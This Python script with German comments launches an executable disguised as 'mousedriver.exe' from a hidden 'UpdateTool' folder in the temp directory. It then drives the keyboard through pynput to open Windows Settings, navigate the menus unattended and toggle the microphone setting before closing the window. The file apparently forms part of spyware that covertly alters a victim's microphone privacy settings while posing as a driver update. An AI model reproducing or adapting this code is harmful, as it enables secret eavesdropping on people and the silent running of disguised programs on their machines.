from pynput.keyboard import Key, Controller as KeyboardController

keyboard = KeyboardController()
import os
import time

# vars setzen

# temppath zu python holen
tmp = os.environ.get('TMP')

# homepath zu python holen
home = os.environ.get('homepath')

# username zu python holen
user = os.environ.get('username')
# Downloadname festlegen
downloadname = "mousedriver.exe"

# erweiterte vars gestalten
# newpath festlegen
newpath_home = home + r'\.UpdateTool'
newpath_tmp = tmp + r'\UpdateTool'

os.system(r'cmd /c "' + newpath_tmp + '\\' + downloadname + r'"')
time.sleep(1)

def key_tap(anzahl, keyname):
    k = int(anzahl)
    for j in range(k):
        keyboard.press(keyname)
        keyboard.release(keyname)


def key_combi(keyzahl, keys):
    k = int(keyzahl)
    for j in range(0, k):
        keyboard.press(keys[j])
    for j in range(0, k):
        keyboard.release(keys[j])


# word = 'tab'
# keyboard.press(Key)
# keyboard.release(Key.word)
# start
key_tap(1, Key.cmd)

time.sleep(0.3)

# einstellungen eingeben und öffnen
keyboard.type('einstellungen')
time.sleep(0.3)
key_tap(1, Key.enter)

time.sleep(0.2)
key_combi(2, [Key.cmd, Key.up])
time.sleep(0.5)
key_tap(1, Key.tab)

time.sleep(0.5)

key_tap(4, Key.right)
time.sleep(0.5)

key_tap(1, Key.enter)
time.sleep(0.5)
key_tap(1, Key.tab)
time.sleep(0.3)
key_tap(6, Key.down)
time.sleep(0.3)
key_tap(1, Key.enter)
time.sleep(0.3)
key_tap(11, Key.tab)
time.sleep(0.3)
key_tap(1, Key.enter)
time.sleep(0.3)
key_tap(11, Key.tab)
time.sleep(0.3)
# umschalten mic symbol
key_tap(1, Key.space)
time.sleep(0.3)
# einstellungen schließen
key_combi(2, [Key.alt_l, Key.f4])
time.sleep(0.3)
